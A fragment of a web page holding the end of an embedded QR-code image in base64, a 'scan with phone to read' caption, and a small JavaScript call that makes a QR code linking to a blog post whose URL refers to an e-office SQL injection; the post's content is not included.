gdiFN1a52ri5Dpn/nMw9xvXrR/R/OF5uq6AtIbgqVV6IPo8spVyGHMq7+K1bPCurqukEPWAa4vF28f9tqekJpYxWp/lauATLOuK/TDqEM4BPWJMOow8u6D5GvNCvN7LL0C4jVXWgWMunmY61VToa+uK2D0l1bRfaVVQPwQ1CeWx9gGYvLC957AYSBOCsZpQnjPy0UYfer9x1TvqA8e97EO4gMsPfzrCCZ6zZkODF+VwMh7v857f/PqIqQvcL2H3D7stfwr3LNp9p8DMuWzOojPepjz3gfigxHtM0OI1xyM/Ezve+jc+pVuHubrmt/j4Y+sffK6/vkT2P6CCsYpwsjdmneDCPHJ9YmQvHyFEJ99IByC6qJ95IUQb89B9PLso/vkED8E1TtC8jBi97kmxGceRl769YTUKXxQbO8hTrHvDTJF8xCuT10uQnzmxbM8pE7fCnu/mQ/S68wLj32QPARna5V2tk55zuJ6Qs5O6Ifz20Ag03fKovuBMQ/hEFz5ntX1ua6oLkLWgyOe1fQecusgPeU9L++oH8Z6CO9+iG7dPr8NZC9e1+87gZcHApmuW3bKEL3z7utcv7oI6de5ftH8DLsH0vNZ3Z6QOvkK7Qvxd76q2+svD2RffF1//wlsA3GaLgGZslzUJ0J88u6TQ3xyEaLDiPbrCPFZb75QTYR4K1ehLpa2D4gfgvo6wpiHkeuHUd+vVdeQfF0b20BscuF7T+AwEMjUVtuCMe9k9cOYhzmHUbfefvA4r3+G8LgW5vney72c6d234jCu2321zmEgJV7xvhM4fJfl1Dq6RXU5jFPvevebV+/Y8/JXcNXTHublkJ9BXTTfuXpHSJ+udw6jD8KB6+9Dbh/22r7LenZfkGnq73dP5xD/SrcPxHfGIT4I6i+Eo7bXYZ53b5A8jFg9noneR95rV3r5rveQOoUPisNAYH53OFUR4us/C7ymr+rP1ul5+PqPz/SeKw7ZKwS7r69hHuZ+8yLEB8GV7jqFh4FYdOF7TmD7LasvX9Oq6Do8nrb+qq3ovLQKdUi/0irUxdIq5CKkTl4I0SBYWkXV76O0CrW63seXvle/rnsesh4Ev5yvX11PyOtn9kcrtt+ynLq4WtW8uPI9q9sHcnd1DtF7P30z7F4Ye0A4BFd+SN419EF0uaivo3mx5yH9gOtzyO3DXtt7CHxNCc6v+8/h1Lu+4t0vh6wtt75zdYgfUDqgtcD9n0TUoC5/FVf1MK7T+8I6f72H9NN6M98G4rTP8Gy/1uuTQ+4KGFEfRO9+8yvUX9g9kJ4Q7PlnObxWX3upWPWvXMUsvw1klry0nz+Bw0AgdwOMuNpaTboC4tcH4RAsT4X5uq6A5NVh5OWpMC9CfHBEPWLVzwJSq0/s3pUOYz2Ew4i9Xi7u1zsMRNOF7zmBbxuIU/bHkIuQu8Y8jFyf+c7Vn0FrRWsga0JQXZ+o3hHGOvPWdTQvQurlM/y2gcyaX9rrJ/CfBwLzqUN0CJ7dPW5dn/wV7LWQtSHYe+mH5CGoD0au3hFGH4Tb/1k/cH1Sv33Y6/CEONWOq33r+928dZC7CoLqHc/WKz+MPawRy/NMrPww7w/RrYORq4vuQV54GIimC99zAttAINOEx7jaJox1Ne2K7of41MtT0TnEByPqmyHEW/32AdEhaG7W45FmnagX0lcuPuuD1APXe8jtw17bE/Jh+/rfbudvAAAA//+cHjfhAAAABklEQVQDALZhU7nkRd6AAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-mobile-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 